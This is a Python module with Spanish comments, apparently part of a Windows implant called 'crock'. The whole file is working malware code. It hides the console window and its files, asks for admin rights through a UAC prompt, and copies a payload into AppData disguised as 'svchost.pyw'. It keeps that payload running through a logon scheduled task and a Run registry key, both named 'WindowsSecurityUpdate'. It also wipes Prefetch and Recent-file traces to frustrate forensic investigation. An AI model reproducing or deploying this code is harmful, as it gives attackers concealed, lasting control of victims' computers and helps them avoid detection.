import os
import sys
import ctypes
import subprocess
import platform
import shutil
import winreg

SYSTEM = platform.system()

def is_admin():
    if SYSTEM == "Windows":
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    return True

def hide_console():
    if SYSTEM == "Windows":
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd != 0:
            ctypes.windll.user32.ShowWindow(hwnd, 0)

def show_console():
    if SYSTEM == "Windows":
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd != 0:
            ctypes.windll.user32.ShowWindow(hwnd, 1)

def hide_file(path):
    if SYSTEM == "Windows":
        try:
            subprocess.run(f'attrib +h +s "{path}"', shell=True, capture_output=True)
        except:
            pass

def elevate_admin():
    """Eleva a admin usando ShellExecuteW con UAC real"""
    if SYSTEM == "Windows":
        try:
            if not is_admin():
                # ShellExecuteW con "runas" para UAC elevation
                ret = ctypes.windll.shell32.ShellExecuteW(
                    None,
                    "runas",
                    sys.executable,
                    " ".join([f'"{arg}"' for arg in sys.argv]),
                    None,
                    1  # SW_SHOWNORMAL
                )
                # ShellExecuteW devuelve >32 si éxito
                if ret > 32:
                    sys.exit(0)
                else:
                    return False
            return True  # Ya es admin
        except Exception as e:
            print(f"[-] Error elevando: {e}")
            return False
    return True

def install_persistence(payload_path, persist_name="WindowsSecurityUpdate", persist_dir="Microsoft\\Windows\\Security"):
    """Instala persistencia: copia payload + scheduled task + registry run key"""
    if SYSTEM != "Windows":
        return False
    
    results = {"copy": False, "task": False, "registry": False}
    
    try:
        # 1. Copiar payload a AppData
        appdata = os.environ.get("APPDATA", "")
        if not appdata:
            return results
        
        target_dir = os.path.join(appdata, persist_dir)
        os.makedirs(target_dir, exist_ok=True)
        
        target_file = os.path.join(target_dir, "svchost.pyw")
        
        try:
            shutil.copy2(payload_path, target_file)
            hide_file(target_dir)
            hide_file(target_file)
            results["copy"] = True
        except:
            pass
        
        # 2. Scheduled task (requiere admin)
        if is_admin():
            try:
                # Buscar pythonw.exe
                python_dir = os.path.dirname(sys.executable)
                pythonw = os.path.join(python_dir, "pythonw.exe")
                if not os.path.exists(pythonw):
                    pythonw = sys.executable
                
                cmd = (
                    f'schtasks /create /tn "{persist_name}" '
                    f'/tr "{pythonw} \\"{target_file}\\"" '
                    f'/sc onlogon /rl highest /f'
                )
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                results["task"] = (result.returncode == 0)
            except:
                pass
        
        # 3. Registry Run key (no requiere admin para HKCU)
        try:
            python_dir = os.path.dirname(sys.executable)
            pythonw = os.path.join(python_dir, "pythonw.exe")
            if not os.path.exists(pythonw):
                pythonw = sys.executable
            
            reg_key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0, winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(
                reg_key, persist_name, 0, winreg.REG_SZ,
                f'"{pythonw}" "{target_file}"'
            )
            winreg.CloseKey(reg_key)
            results["registry"] = True
        except:
            pass
    
    except Exception as e:
        pass
    
    return results

def remove_persistence(persist_name="WindowsSecurityUpdate", persist_dir="Microsoft\\Windows\\Security"):
    """Elimina persistencia instalada"""
    if SYSTEM != "Windows":
        return
    
    try:
        # Quitar scheduled task
        subprocess.run(
            f'schtasks /delete /tn "{persist_name}" /f',
            shell=True, capture_output=True
        )
    except:
        pass
    
    try:
        # Quitar registry key
        reg_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(reg_key, persist_name)
        winreg.CloseKey(reg_key)
    except:
        pass
    
    try:
        # Borrar archivo
        appdata = os.environ.get("APPDATA", "")
        target_file = os.path.join(appdata, persist_dir, "svchost.pyw")
        if os.path.exists(target_file):
            os.remove(target_file)
    except:
        pass

def cleanup_traces():
    """Limpia rastros forenses básicos"""
    if SYSTEM != "Windows":
        return
    
    try:
        # Limpiar prefetch (requiere admin)
        if is_admin():
            prefetch_dir = os.path.join(os.environ.get("SYSTEMROOT", "C:\\Windows"), "Prefetch")
            for f in os.listdir(prefetch_dir):
                if "PYTHON" in f.upper() or "CROCK" in f.upper():
                    try:
                        os.remove(os.path.join(prefetch_dir, f))
                    except:
                        pass
    except:
        pass
    
    try:
        # Limpiar recent files del payload
        recent_dir = os.path.join(os.environ.get("APPDATA", ""), "Microsoft\\Windows\\Recent")
        for f in os.listdir(recent_dir):
            if "crock" in f.lower() or "payload" in f.lower() or "svchost.pyw" in f.lower():
                try:
                    os.remove(os.path.join(recent_dir, f))
                except:
                    pass
    except:
        pass
